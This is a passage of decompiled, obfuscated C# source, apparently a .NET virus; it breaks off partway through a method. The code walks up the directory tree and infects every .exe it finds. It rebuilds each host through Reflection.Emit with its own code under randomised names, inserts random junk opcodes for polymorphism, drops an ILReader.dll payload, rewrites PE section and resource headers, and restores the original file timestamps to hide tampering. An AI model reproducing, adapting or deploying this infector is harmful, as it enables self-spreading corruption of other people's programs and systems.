using System;
using System.Collections;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Security.Policy;
using System.Threading;
using Reflector.Disassembler;

namespace ZmsayuCkhvtdp;

internal class cLoPfikrwuzkt
{
	private class krdmtaZkDwi
	{
		private Type krxYXuihqHp;

		private TypeBuilder llyprdvzod;

		public ArrayList uBHtliyPxosdGz;

		public ArrayList tmvqbnhkxnjk;

		public ArrayList baydfwiocil;

		public ArrayList tjmxhaznV;

		public ArrayList cnoyhbdvl;

		public ArrayList QhoipomrhMv;

		public ArrayList pgxDbqbayM;

		public ArrayList tOmozkvhr;

		public ArrayList LmWpgOjWd;

		public ArrayList koCffsgizZer;

		public krdmtaZkDwi()
		{
			//Error decoding local variables: Signature type sequence must have at least one element.
			baydfwiocil = new ArrayList();
			tjmxhaznV = new ArrayList();
			uBHtliyPxosdGz = new ArrayList();
			tmvqbnhkxnjk = new ArrayList();
			pgxDbqbayM = new ArrayList();
			tOmozkvhr = new ArrayList();
			cnoyhbdvl = new ArrayList();
			QhoipomrhMv = new ArrayList();
			LmWpgOjWd = new ArrayList();
			koCffsgizZer = new ArrayList();
		}

		protected override void kazdifwl()
		{
			//Error decoding local variables: Signature type sequence must have at least one element.
			try
			{
				knhawedfilV();
			}
			finally
			{
				base.Finalize();
			}
		}

		public void knhawedfilV()
		{
			//Error decoding local variables: Signature type sequence must have at least one element.
			baydfwiocil.Clear();
			tjmxhaznV.Clear();
			uBHtliyPxosdGz.Clear();
			tmvqbnhkxnjk.Clear();
			pgxDbqbayM.Clear();
			tOmozkvhr.Clear();
			cnoyhbdvl.Clear();
			QhoipomrhMv.Clear();
			LmWpgOjWd.Clear();
			koCffsgizZer.Clear();
		}

		public bool oxddocf()
		{
			return (object)krxYXuihqHp == null;
		}

		public void dzdZfznzhFpxh(Type intype, TypeBuilder outtype)
		{
			krxYXuihqHp = intype;
			llyprdvzod = outtype;
		}

		public Type pbaaxFcikJep()
		{
			return krxYXuihqHp;
		}

		public TypeBuilder asriksIedgckQ()
		{
			return llyprdvzod;
		}
	}

	public class gvqtss
	{
		private ArrayList xPjwrvCsep;

		public gvqtss()
		{
			xPjwrvCsep = new ArrayList();
		}

		protected override void Fbidkc()
		{
			//Error decoding local variables: Signature type sequence must have at least one element.
			try
			{
			}
			finally
			{
				base.Finalize();
			}
		}

		public void kuimmHd()
		{
			foreach (krdmtaZkDwi item in xPjwrvCsep)
			{
				item.knhawedfilV();
			}
			xPjwrvCsep.Clear();
		}

		public void kPlrobs(Type intype, TypeBuilder outtype)
		{
			krdmtaZkDwi krdmtaZkDwi = new krdmtaZkDwi();
			krdmtaZkDwi.dzdZfznzhFpxh(intype, outtype);
			xPjwrvCsep.Add(krdmtaZkDwi);
		}

		public void Vbmxip(Type intype, ModuleBuilder moduleBuilder)
		{
			foreach (krdmtaZkDwi item in xPjwrvCsep)
			{
				if (!(item.pbaaxFcikJep().FullName == intype.FullName))
				{
					continue;
				}
				PropertyInfo[] properties = item.pbaaxFcikJep().GetProperties(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
				foreach (PropertyInfo propertyInfo in properties)
				{
					if (propertyInfo.Name == "SectionHeaders")
					{
						Console.WriteLine();
					}
					TypeBuilder typeBuilder = azMJkzgQbgH(propertyInfo.PropertyType);
					PropertyBuilder value = (((object)typeBuilder == null) ? item.asriksIedgckQ().DefineProperty(VeLepnrjbbj(item.pbaaxFcikJep()) ? upyalxworwxo.mnsvme() : propertyInfo.Name, propertyInfo.Attributes, propertyInfo.PropertyType, null) : item.asriksIedgckQ().DefineProperty(VeLepnrjbbj(item.pbaaxFcikJep()) ? upyalxworwxo.mnsvme() : propertyInfo.Name, propertyInfo.Attributes, typeBuilder, null));
					item.baydfwiocil.Add(propertyInfo);
					item.tjmxhaznV.Add(value);
				}
				FieldInfo[] fields = item.pbaaxFcikJep().GetFields(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
				foreach (FieldInfo fieldInfo in fields)
				{
					TypeBuilder typeBuilder2 = azMJkzgQbgH(fieldInfo.FieldType);
					FieldBuilder fieldBuilder = (((object)typeBuilder2 == null) ? item.asriksIedgckQ().DefineField(VeLepnrjbbj(item.pbaaxFcikJep()) ? upyalxworwxo.mnsvme() : fieldInfo.Name, fieldInfo.FieldType, fieldInfo.Attributes) : item.asriksIedgckQ().DefineField(VeLepnrjbbj(item.pbaaxFcikJep()) ? upyalxworwxo.mnsvme() : fieldInfo.Name, typeBuilder2, fieldInfo.Attributes));
					if ((object)fieldBuilder.DeclaringType!.Assembly == moduleBuilder.Assembly)
					{
						item.uBHtliyPxosdGz.Add(fieldInfo);
						item.tmvqbnhkxnjk.Add(fieldBuilder);
						continue;
					}
					throw new Exception();
				}
				ConstructorInfo[] constructors = item.pbaaxFcikJep().GetConstructors(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
				foreach (ConstructorInfo constructorInfo in constructors)
				{
					ParameterInfo[] parameters = constructorInfo.GetParameters();
					Type[] array = new Type[checked((uint)parameters.Length)];
					for (int l = 0; l < parameters.Length; l++)
					{
						TypeBuilder typeBuilder3 = azMJkzgQbgH(parameters[l].ParameterType);
						if ((object)typeBuilder3 != null)
						{
							array[l] = typeBuilder3;
						}
						else
						{
							array[l] = parameters[l].ParameterType;
						}
					}
					ConstructorBuilder ctorBuilder = item.asriksIedgckQ().DefineConstructor(constructorInfo.Attributes, constructorInfo.CallingConvention, array);
					otgpxxapbwckv(constructorInfo, ref ctorBuilder);
					item.LmWpgOjWd.Add(constructorInfo);
					item.koCffsgizZer.Add(ctorBuilder);
				}
				EventInfo[] events = item.pbaaxFcikJep().GetEvents(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
				foreach (EventInfo eventInfo in events)
				{
					EventBuilder value2 = item.asriksIedgckQ().DefineEvent(VeLepnrjbbj(item.pbaaxFcikJep()) ? upyalxworwxo.mnsvme() : eventInfo.Name, eventInfo.Attributes, eventInfo.EventHandlerType);
					item.pgxDbqbayM.Add(eventInfo);
					item.tOmozkvhr.Add(value2);
				}
				MethodInfo[] methods = item.pbaaxFcikJep().GetMethods(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
				foreach (MethodBase methodBase in methods)
				{
					if (methodBase.Name == "Main" && (object)methodBase.DeclaringType == typeof(cLoPfikrwuzkt))
					{
						continue;
					}
					if (methodBase.Name == "Go")
					{
						ltekmr = methodBase;
					}
					ParameterInfo[] parameters2 = methodBase.GetParameters();
					Type[] array2 = new Type[checked((uint)parameters2.Length)];
					for (int num = 0; num < parameters2.Length; num++)
					{
						TypeBuilder typeBuilder4 = azMJkzgQbgH(parameters2[num].ParameterType);
						if ((object)typeBuilder4 != null)
						{
							array2[num] = typeBuilder4;
						}
						else
						{
							array2[num] = parameters2[num].ParameterType;
						}
					}
					Type returnType = ((MethodInfo)methodBase).ReturnType;
					TypeBuilder typeBuilder5 = azMJkzgQbgH(returnType);
					string name = methodBase.Name;
					MethodBuilder methodBuilder = (((object)typeBuilder5 == null) ? item.asriksIedgckQ().DefineMethod((!VeLepnrjbbj(item.pbaaxFcikJep()) || !(name != "Go")) ? name : upyalxworwxo.mnsvme(), methodBase.Attributes, methodBase.CallingConvention, returnType, array2) : item.asriksIedgckQ().DefineMethod((!VeLepnrjbbj(item.pbaaxFcikJep()) || !(name != "Go")) ? name : upyalxworwxo.mnsvme(), methodBase.Attributes, methodBase.CallingConvention, typeBuilder5, array2));
					cwgzlpwcJgvZbe(methodBase, ref methodBuilder);
					item.QhoipomrhMv.Add(methodBuilder);
					item.cnoyhbdvl.Add(methodBase);
				}
			}
		}

		public MethodBuilder xqPnWts(Type type, MethodBase methodBase)
		{
			int num = 0;
			while (true)
			{
				if (num < xPjwrvCsep.Count)
				{
					if (((krdmtaZkDwi)xPjwrvCsep[num]).pbaaxFcikJep().FullName == type.FullName)
					{
						break;
					}
					num++;
					continue;
				}
				return null;
			}
			int num2 = 0;
			while (true)
			{
				if (num2 < ((krdmtaZkDwi)xPjwrvCsep[num]).cnoyhbdvl.Count)
				{
					MethodBase methodBase2 = (MethodBase)((krdmtaZkDwi)xPjwrvCsep[num]).cnoyhbdvl[num2];
					if (methodBase.GetHashCode() == methodBase2.GetHashCode())
					{
						break;
					}
					num2++;
					continue;
				}
				return null;
			}
			return (MethodBuilder)((krdmtaZkDwi)xPjwrvCsep[num]).QhoipomrhMv[num2];
		}

		public ConstructorBuilder Ujxjurmh(Type type, ConstructorInfo ctorInfo)
		{
			int num = 0;
			while (true)
			{
				if (num < xPjwrvCsep.Count)
				{
					if (((krdmtaZkDwi)xPjwrvCsep[num]).pbaaxFcikJep().FullName == type.FullName)
					{
						break;
					}
					num++;
					continue;
				}
				return null;
			}
			int num2 = 0;
			while (true)
			{
				if (num2 < ((krdmtaZkDwi)xPjwrvCsep[num]).LmWpgOjWd.Count)
				{
					ConstructorInfo constructorInfo = (ConstructorInfo)((krdmtaZkDwi)xPjwrvCsep[num]).LmWpgOjWd[num2];
					if (ctorInfo.GetHashCode() == constructorInfo.GetHashCode())
					{
						break;
					}
					num2++;
					continue;
				}
				return null;
			}
			return (ConstructorBuilder)((krdmtaZkDwi)xPjwrvCsep[num]).koCffsgizZer[num2];
		}

		public PropertyBuilder idxxnzit(Type type, PropertyInfo propertyInfo)
		{
			int num = 0;
			while (true)
			{
				if (num < xPjwrvCsep.Count)
				{
					if (((krdmtaZkDwi)xPjwrvCsep[num]).pbaaxFcikJep().FullName == type.FullName)
					{
						break;
					}
					num++;
					continue;
				}
				return null;
			}
			int num2 = 0;
			while (true)
			{
				if (num2 < ((krdmtaZkDwi)xPjwrvCsep[num]).baydfwiocil.Count)
				{
					PropertyInfo propertyInfo2 = (PropertyInfo)((krdmtaZkDwi)xPjwrvCsep[num]).baydfwiocil[num2];
					if (propertyInfo.Name == propertyInfo2.Name && (object)propertyInfo.DeclaringType == propertyInfo2.DeclaringType)
					{
						break;
					}
					num2++;
					continue;
				}
				return null;
			}
			return (PropertyBuilder)((krdmtaZkDwi)xPjwrvCsep[num]).tjmxhaznV[num2];
		}

		public FieldBuilder cjhoWxb(Type type, FieldInfo fieldInfo)
		{
			int num = 0;
			while (true)
			{
				if (num < xPjwrvCsep.Count)
				{
					if (((krdmtaZkDwi)xPjwrvCsep[num]).pbaaxFcikJep().FullName == type.FullName)
					{
						break;
					}
					num++;
					continue;
				}
				return null;
			}
			int num2 = 0;
			while (true)
			{
				if (num2 < ((krdmtaZkDwi)xPjwrvCsep[num]).uBHtliyPxosdGz.Count)
				{
					FieldInfo fieldInfo2 = (FieldInfo)((krdmtaZkDwi)xPjwrvCsep[num]).uBHtliyPxosdGz[num2];
					if (fieldInfo.Name == fieldInfo2.Name && (object)fieldInfo.DeclaringType == fieldInfo2.DeclaringType)
					{
						break;
					}
					num2++;
					continue;
				}
				return null;
			}
			return (FieldBuilder)((krdmtaZkDwi)xPjwrvCsep[num]).tmvqbnhkxnjk[num2];
		}

		public EventBuilder tlcwlkKlxvfzn(Type type, EventInfo eventInfo)
		{
			int num = 0;
			while (true)
			{
				if (num < xPjwrvCsep.Count)
				{
					if (((krdmtaZkDwi)xPjwrvCsep[num]).pbaaxFcikJep().FullName == type.FullName)
					{
						break;
					}
					num++;
					continue;
				}
				return null;
			}
			int num2 = 0;
			while (true)
			{
				if (num2 < ((krdmtaZkDwi)xPjwrvCsep[num]).pgxDbqbayM.Count)
				{
					EventInfo eventInfo2 = (EventInfo)((krdmtaZkDwi)xPjwrvCsep[num]).pgxDbqbayM[num2];
					if (eventInfo.Name == eventInfo2.Name && (object)eventInfo.DeclaringType == eventInfo2.DeclaringType)
					{
						break;
					}
					num2++;
					continue;
				}
				return null;
			}
			return (EventBuilder)((krdmtaZkDwi)xPjwrvCsep[num]).tOmozkvhr[num2];
		}

		public TypeBuilder azMJkzgQbgH(Type type)
		{
			int num = 0;
			while (true)
			{
				if (num < xPjwrvCsep.Count)
				{
					if (((krdmtaZkDwi)xPjwrvCsep[num]).pbaaxFcikJep().FullName == type.FullName)
					{
						break;
					}
					num++;
					continue;
				}
				return null;
			}
			return ((krdmtaZkDwi)xPjwrvCsep[num]).asriksIedgckQ();
		}
	}

	private class nfxywup
	{
		private ILGenerator afkxgvjrb;

		private LocalBuilder[] byppyG;

		public nfxywup(ILGenerator ilGenerator, LocalBuilder[] localBuilders)
		{
			afkxgvjrb = ilGenerator;
			byppyG = localBuilders;
		}

		public void qzhzmtkhk()
		{
			if (sxjmcJhkfwmkw.Next(10) == 0)
			{
				afkxgvjrb.Emit(OpCodes.Nop);
			}
			if (sxjmcJhkfwmkw.Next(20) == 0 && byppyG.Length > 0)
			{
				LocalBuilder local = byppyG[sxjmcJhkfwmkw.Next(byppyG.Length)];
				afkxgvjrb.Emit(OpCodes.Ldloc, local);
				afkxgvjrb.Emit(OpCodes.Pop);
			}
		}
	}

	private sealed class AssemblyProvider : IAssemblyProvider
	{
		public Assembly[] GetAssemblies()
		{
			throw new NotImplementedException();
		}

		public Assembly Load(string assemblyName)
		{
			return Assembly.Load(assemblyName);
		}
	}

	private class meJkIwzhgrp
	{
		protected int hoBbeoz;

		protected byte[] NtyOusi = new byte[128];

		[SpecialName]
		public int xlnlylobmtaoM()
		{
			return hoBbeoz;
		}

		public void uiTmdCvrqgni(BinaryReader source)
		{
			//Error decoding local variables: Signature type sequence must have at least one element.
			source.Read(NtyOusi, 0, NtyOusi.Length);
			hoBbeoz = NtyOusi[60] | (NtyOusi[61] << 8) | (NtyOusi[62] << 16) | (NtyOusi[63] << 24);
		}
	}

	private class Nckabmwppivk
	{
		protected byte[] OrxLxhrl = new byte[4];

		protected ushort ykYiyf;

		protected ushort bcfvfqxkZuzo;

		protected int qiyfztrtZtipi;

		protected ushort kyZayppvutitca;

		protected ushort fpnhjfxskJc;

		protected ushort ppadHzchpxwqg;

		protected byte rqndhl;

		protected byte gyypdufk;

		protected uint famqmz;

		protected uint fGeQmK;

		protected uint qdzzShuH;

		protected uint sivtgK;

		protected uint yzvdJAmzkizu;

		protected uint uKtpzswnhkiwjc;

		protected uint sulogr;

		public uint nhNusjdio;

		public uint ngxlzBtamejzii;

		protected ushort fsfelkmh;

		protected ushort pdwKcdPmSbb;

		protected ushort watxszmYxd;

		protected ushort bvytfiw;

		protected ushort vQflqzue;

		protected ushort lvevdn;

		protected uint txnrxq;

		public uint Hxsgqlr;

		protected uint xluwcw;

		protected uint anJvmRvDl;

		protected uint tzjkKuwwc;

		protected uint dekuyt;

		protected uint orbdzksu;

		protected uint vbFOopLrcwilt;

		protected uint uszasNu;

		protected uint nootpyp;

		protected uint dauwQlypBs;

		protected jwLqkWwE jpbcakdcoioox;

		protected jwLqkWwE awXuxstwczxv;

		public jwLqkWwE jFyqnvJtiX;

		protected jwLqkWwE prmydpupiylRk;

		protected jwLqkWwE fpxufckipVyT;

		protected jwLqkWwE ZefyonequbMjWu;

		protected jwLqkWwE PscylxSzwnO;

		protected jwLqkWwE sskmvpr;

		protected jwLqkWwE bsjeujahpfwmp;

		protected jwLqkWwE bchysdmrsrkxnv;

		protected jwLqkWwE iVkgwi;

		protected jwLqkWwE pmsetx;

		protected jwLqkWwE ncvWjHclwi;

		protected jwLqkWwE yntxPyxio;

		public jwLqkWwE EfeqsXom;

		public jwLqkWwE obzujedieIe;

		public ArrayList dfrJlhbJG;

		public byte[] UlOpjdvYl(BinaryReader source)
		{
			try
			{
				if (jFyqnvJtiX.ufrMmSbQy != 0)
				{
					source.BaseStream.Position = hMdYwwilvivmpG(jFyqnvJtiX.ufrMmSbQy);
					return source.ReadBytes((int)jFyqnvJtiX.Igbfxuwlumkzs);
				}
				return null;
			}
			catch
			{
				return null;
			}
		}

		public void datvgvcyreni(BinaryReader source, meJkIwzhgrp msdosheader)
		{
			source.BaseStream.Position = msdosheader.xlnlylobmtaoM();
			source.Read(OrxLxhrl, 0, 4);
			if (OrxLxhrl[0] == 80 && OrxLxhrl[1] == 69 && OrxLxhrl[2] == 0 && OrxLxhrl[3] == 0)
			{
				ykYiyf = source.ReadUInt16();
				if (ykYiyf != 332)
				{
					throw new Exception("Incorrect machine id code");
				}
				bcfvfqxkZuzo = source.ReadUInt16();
				qiyfztrtZtipi = source.ReadInt32();
				if (source.ReadInt32() != 0)
				{
					throw new Exception("Symbol table offset != 0");
				}
				if (source.ReadInt32() != 0)
				{
					throw new Exception("Symbol table count != 0");
				}
				kyZayppvutitca = source.ReadUInt16();
				fpnhjfxskJc = source.ReadUInt16();
				ppadHzchpxwqg = source.ReadUInt16();
				if (ppadHzchpxwqg != 267)
				{
					throw new Exception("Bad magic number for PE Optional Header");
				}
				rqndhl = source.ReadByte();
				gyypdufk = source.ReadByte();
				if (rqndhl == 6 && gyypdufk == 0)
				{
					famqmz = source.ReadUInt32();
					fGeQmK = source.ReadUInt32();
					qdzzShuH = source.ReadUInt32();
					sivtgK = source.ReadUInt32();
					yzvdJAmzkizu = source.ReadUInt32();
					uKtpzswnhkiwjc = source.ReadUInt32();
					sulogr = source.ReadUInt32();
					nhNusjdio = source.ReadUInt32();
					ngxlzBtamejzii = source.ReadUInt32();
					fsfelkmh = source.ReadUInt16();
					pdwKcdPmSbb = source.ReadUInt16();
					watxszmYxd = source.ReadUInt16();
					bvytfiw = source.ReadUInt16();
					vQflqzue = source.ReadUInt16();
					lvevdn = source.ReadUInt16();
					source.ReadUInt32();
					Hxsgqlr = source.ReadUInt32();
					txnrxq = source.ReadUInt32();
					xluwcw = source.ReadUInt32();
					anJvmRvDl = source.ReadUInt16();
					tzjkKuwwc = source.ReadUInt16();
					dekuyt = source.ReadUInt32();
					orbdzksu = source.ReadUInt32();
					vbFOopLrcwilt = source.ReadUInt32();
					uszasNu = source.ReadUInt32();
					nootpyp = source.ReadUInt32();
					dauwQlypBs = source.ReadUInt32();
					jpbcakdcoioox = new jwLqkWwE(source.ReadUInt32(), source.ReadUInt32());
					awXuxstwczxv = new jwLqkWwE(source.ReadUInt32(), source.ReadUInt32());
					jFyqnvJtiX = new jwLqkWwE(source.ReadUInt32(), source.ReadUInt32());
					prmydpupiylRk = new jwLqkWwE(source.ReadUInt32(), source.ReadUInt32());
					fpxufckipVyT = new jwLqkWwE(source.ReadUInt32(), source.ReadUInt32());
					ZefyonequbMjWu = new jwLqkWwE(source.ReadUInt32(), source.ReadUInt32());
					PscylxSzwnO = new jwLqkWwE(source.ReadUInt32(), source.ReadUInt32());
					sskmvpr = new jwLqkWwE(source.ReadUInt32(), source.ReadUInt32());
					bsjeujahpfwmp = new jwLqkWwE(source.ReadUInt32(), source.ReadUInt32());
					bchysdmrsrkxnv = new jwLqkWwE(source.ReadUInt32(), source.ReadUInt32());
					iVkgwi = new jwLqkWwE(source.ReadUInt32(), source.ReadUInt32());
					pmsetx = new jwLqkWwE(source.ReadUInt32(), source.ReadUInt32());
					ncvWjHclwi = new jwLqkWwE(source.ReadUInt32(), source.ReadUInt32());
					yntxPyxio = new jwLqkWwE(source.ReadUInt32(), source.ReadUInt32());
					EfeqsXom = new jwLqkWwE(source.ReadUInt32(), source.ReadUInt32());
					obzujedieIe = new jwLqkWwE(source.ReadUInt32(), source.ReadUInt32());
					dfrJlhbJG = new ArrayList();
					for (int i = 0; i < bcfvfqxkZuzo; i++)
					{
						dfrJlhbJG.Add(new uelNaxqhxdce());
						((uelNaxqhxdce)dfrJlhbJG[i]).mywlqd(source);
					}
					return;
				}
				throw new Exception("Bad L number");
			}
			throw new Exception("Missing PE file signature");
		}

		public uint hMdYwwilvivmpG(uint rva)
		{
			int num = 0;
			while (true)
			{
				if (num < dfrJlhbJG.Count)
				{
					if (((uelNaxqhxdce)dfrJlhbJG[num]).adgotxfpeHroa <= rva && rva < ((uelNaxqhxdce)dfrJlhbJG[num]).adgotxfpeHroa + ((uelNaxqhxdce)dfrJlhbJG[num]).bmVqguLjex)
					{
						break;
					}
					num++;
					continue;
				}
				throw new Exception("Unresolvable RVA " + rva);
			}
			return ((uelNaxqhxdce)dfrJlhbJG[num]).nwFuZq + (rva - ((uelNaxqhxdce)dfrJlhbJG[num]).adgotxfpeHroa);
		}
	}

	private class onxrrwuejxvmmp : Nckabmwppivk
	{
		public void WbnnxhoB(jwLqkWwE d, BinaryWriter dest, meJkIwzhgrp msdosheader)
		{
			dest.BaseStream.Position = msdosheader.xlnlylobmtaoM() + 136;
			dest.Write(d.ufrMmSbQy);
			dest.Write(d.Igbfxuwlumkzs);
		}

		public void jtsafT(uelNaxqhxdce sh, BinaryReader source, BinaryWriter dest, meJkIwzhgrp msdosheader)
		{
			source.BaseStream.Position = msdosheader.xlnlylobmtaoM() + 6;
			ushort num = source.ReadUInt16();
			dest.BaseStream.Position = msdosheader.xlnlylobmtaoM() + 6;
			dest.Write(num + 1);
			dest.BaseStream.Position = msdosheader.xlnlylobmtaoM() + 248 + num * 40;
			sh.rnzpjfz(dest);
		}

		public void XrzVuXxBglt(uint isize, BinaryWriter dest, meJkIwzhgrp msdosheader)
		{
			dest.BaseStream.Position = msdosheader.xlnlylobmtaoM() + 80;
			dest.Write(isize);
		}

		public void nebiUsHHUctnnu(uint resOffset, uint oldResRVA, uint newResRVA, BinaryReader src, BinaryWriter dest)
		{
			ilsAyeaoAkqoir(resOffset, 0u, oldResRVA, newResRVA, src, dest);
		}

		private void ilsAyeaoAkqoir(uint resOffset, uint nodeOffset, uint oldResRVA, uint newResRVA, BinaryReader src, BinaryWriter dest)
		{
			src.BaseStream.Position = resOffset + nodeOffset + 12;
			ushort num = src.ReadUInt16();
			num = (ushort)(num + src.ReadUInt16());
			for (int i = 0; i < num; i++)
			{
				src.ReadUInt32();
				uint num2 = src.ReadUInt32();
				long position = src.BaseStream.Position;
				if ((num2 & 0x80000000u) != 0)
				{
					ilsAyeaoAkqoir(resOffset, num2 & 0x7FFFFFFFu, oldResRVA, newResRVA, src, dest);
				}
				else
				{
					uuubfcjmdtof(resOffset + num2, oldResRVA, newResRVA, src, dest);
				}
				src.BaseStream.Position = position;
			}
		}

		private void uuubfcjmdtof(uint dataOffset, uint oldResRVA, uint newResRVA, BinaryReader src, BinaryWriter dest)
		{
			src.BaseStream.Position = dataOffset;
			uint num = src.ReadUInt32();
			num += newResRVA;
			num -= oldResRVA;
			dest.BaseStream.Position = src.BaseStream.Position - 4L;
			dest.Write(num);
			dest.BaseStream.Position += 12L;
			src.BaseStream.Position += 12L;
		}
	}

	private class jwLqkWwE
	{
		public uint ufrMmSbQy;

		public uint Igbfxuwlumkzs;

		public jwLqkWwE(uint rva, uint size)
		{
			ufrMmSbQy = rva;
			Igbfxuwlumkzs = size;
		}

		public override string bdqagxAimwyfq()
		{
			return "0x" + ufrMmSbQy.ToString("X8") + ",0x" + Igbfxuwlumkzs.ToString("X8");
		}
	}

	private class uelNaxqhxdce
	{
		public byte[] ttceijPjMs;

		public uint bmVqguLjex;

		public uint adgotxfpeHroa;

		public uint aivsira;

		public uint nwFuZq;

		protected uint yObolcng;

		protected uint qlorzfifaDdpfi;

		protected ushort somjayrkjmcme;

		protected ushort rmybbenkt;

		public uint mfVvrMc;

		public uelNaxqhxdce()
		{
			rmybbenkt = 0;
			somjayrkjmcme = 0;
			qlorzfifaDdpfi = 0u;
			yObolcng = 0u;
		}

		public uelNaxqhxdce(string strname, uint vsize, uint vaddr, uint phsize, uint phoffs, uint flags)
		{
			ttceijPjMs = new byte[8];
			for (int i = 0; i < strname.Length && i < 8; i++)
			{
				ttceijPjMs[i] = (byte)strname[i];
			}
			bmVqguLjex = vsize;
			adgotxfpeHroa = vaddr;
			aivsira = phsize;
			nwFuZq = phoffs;
			mfVvrMc = flags;
			rmybbenkt = 0;
			somjayrkjmcme = 0;
			qlorzfifaDdpfi = 0u;
			yObolcng = 0u;
		}

		public void rnzpjfz(BinaryWriter dest)
		{
			//Error decoding local variables: Signature type sequence must have at least one element.
			dest.Write(ttceijPjMs, 0, 8);
			dest.Write(bmVqguLjex);
			dest.Write(adgotxfpeHroa);
			dest.Write(aivsira);
			dest.Write(nwFuZq);
			dest.Write(yObolcng);
			dest.Write(qlorzfifaDdpfi);
			dest.Write(somjayrkjmcme);
			dest.Write(rmybbenkt);
			dest.Write(mfVvrMc);
		}

		public void mywlqd(BinaryReader source)
		{
			//Error decoding local variables: Signature type sequence must have at least one element.
			ttceijPjMs = new byte[8];
			source.Read(ttceijPjMs, 0, 8);
			bmVqguLjex = source.ReadUInt32();
			adgotxfpeHroa = source.ReadUInt32();
			aivsira = source.ReadUInt32();
			nwFuZq = source.ReadUInt32();
			yObolcng = source.ReadUInt32();
			qlorzfifaDdpfi = source.ReadUInt32();
			somjayrkjmcme = source.ReadUInt16();
			rmybbenkt = source.ReadUInt16();
			mfVvrMc = source.ReadUInt32();
		}
	}

	private class yazIynfgts
	{
		private Random afremfxwqvztve;

		private int xwfudihy;

		private int zpZhkvfmdhyv;

		public yazIynfgts(int len1, int len2, int seed)
		{
			afremfxwqvztve = new Random(seed);
			xwfudihy = len1;
			zpZhkvfmdhyv = len2;
		}

		public string mnsvme()
		{
			string text = "";
			int num = afremfxwqvztve.Next(xwfudihy, zpZhkvfmdhyv);
			for (int i = 0; i < num; i++)
			{
				text = ((afremfxwqvztve.Next(8) != 1) ? (text + (char)(97 + afremfxwqvztve.Next(26))) : (text + (char)(65 + afremfxwqvztve.Next(26))));
			}
			return text;
		}
	}

	private static yazIynfgts upyalxworwxo = new yazIynfgts(6, 15, Environment.TickCount);

	private static Random sxjmcJhkfwmkw = new Random(Environment.TickCount);

	private static byte[] vTtdLb;

	private static MethodBase ltekmr;

	public static bool ejeiqjp;

	public cLoPfikrwuzkt(string inFileName, string outFileName)
	{
		try
		{
			ejeiqjp = true;
			lvnTfngtgDldwa(inFileName, outFileName);
			if (!ejeiqjp)
			{
				lvnTfngtgDldwa(inFileName, outFileName);
			}
		}
		catch (Exception)
		{
		}
	}

	private static bool VeLepnrjbbj(Type t)
	{
		return (object)t.Assembly == Assembly.GetExecutingAssembly() && -1 == t.FullName!.IndexOf("AssemblyProvider");
	}

	public static void Go()
	{
		vTtdLb = laevpAmzssrm();
		string currentDirectory;
		do
		{
			ytukogNoiexae();
			currentDirectory = Directory.GetCurrentDirectory();
			Directory.SetCurrentDirectory("..");
		}
		while (currentDirectory != Directory.GetCurrentDirectory());
	}

	public static void ytukogNoiexae()
	{
		string[] files = Directory.GetFiles(".", "*.exe");
		if (files.Length == 0)
		{
			return;
		}
		bool flag;
		if (!(flag = File.Exists("ILReader.dll")) && vTtdLb != null)
		{
			FileStream fileStream = new FileStream("ILReader.dll", FileMode.CreateNew, FileAccess.ReadWrite);
			if (fileStream != null)
			{
				BinaryWriter binaryWriter = new BinaryWriter(fileStream);
				binaryWriter.Write(vTtdLb);
			}
			fileStream.Close();
		}
		string[] array = files;
		foreach (string path in array)
		{
			string fileName = Path.GetFileName(path);
			string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(fileName);
			string text = "_" + fileName;
			if (fileName[0] == '_' || fileNameWithoutExtension == Assembly.GetExecutingAssembly().GetName().Name || File.Exists(text))
			{
				continue;
			}
			DateTime creationTime = File.GetCreationTime(fileName);
			DateTime lastAccessTime = File.GetLastAccessTime(fileName);
			DateTime lastWriteTime = File.GetLastWriteTime(fileName);
			File.Move(fileName, text);
			try
			{
				object[] array2 = new object[2] { text, fileName };
				AppDomain appDomain = AppDomain.CreateDomain("domain");
				Type typeFromHandle = typeof(cLoPfikrwuzkt);
				string name = Assembly.GetExecutingAssembly().GetName().Name;
				appDomain.CreateInstance(name, typeFromHandle.FullName, false, BindingFlags.Default, (Binder)null, array2, (CultureInfo)null, (object[])null, (Evidence)null);
				AppDomain.Unload(appDomain);
				if (File.Exists(fileName))
				{
					File.Delete(text);
					xPiewjhaunzk(fileName, vTtdLb);
					File.SetCreationTime(fileName, creationTime);
					File.SetLastAccessTime(fileName, lastAccessTime);
					File.SetLastWriteTime(fileName, lastWriteTime);
					string path2 = fileNameWithoutExtension + ".resources";
					if (File.Exists(path2))
					{
						File.SetCreationTime(path2, creationTime);
						File.SetLastAccessTime(path2, lastAccessTime);
						File.SetLastWriteTime(path2, lastWriteTime);
					}
				}
				else
				{
					File.Move(text, fileName);
				}
			}
			catch (ThreadAbortException)
			{
				File.Move(text, fileName);
			}
			catch (Exception)
			{
			}
		}
		if (!flag)
		{
			File.Delete("ILReader.dll");
		}
	}

	private static PEFileKinds hnunWlnV(string filename)
	{
		FileStream fileStream = new FileStream(filename, FileMode.Open, FileAccess.Read);
		if (fileStream == null)
		{
			return (PEFileKinds)0;
		}
		byte[] array = new byte[4];
		fileStream.Seek(60L, SeekOrigin.Begin);
		fileStream.Read(array, 0, 4);
		uint num = array[0] | ((uint)array[1] >> 8) | ((uint)array[2] >> 16) | ((uint)array[3] >> 24);
		fileStream.Seek(num + 92, SeekOrigin.Begin);
		fileStream.Read(array, 0, 1);
		fileStream.Close();
		if (array[0] == 3)
		{
			return PEFileKinds.ConsoleApplication;
		}
		return PEFileKinds.WindowApplication;
	}

	public static void lvnTfngtgDldwa(string inFileName, string outFileName)
	{
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0126: Expected O, but got Unknown
		PEFileKinds filetype = hnunWlnV(inFileName);
		gvqtss gvqtss = new gvqtss();
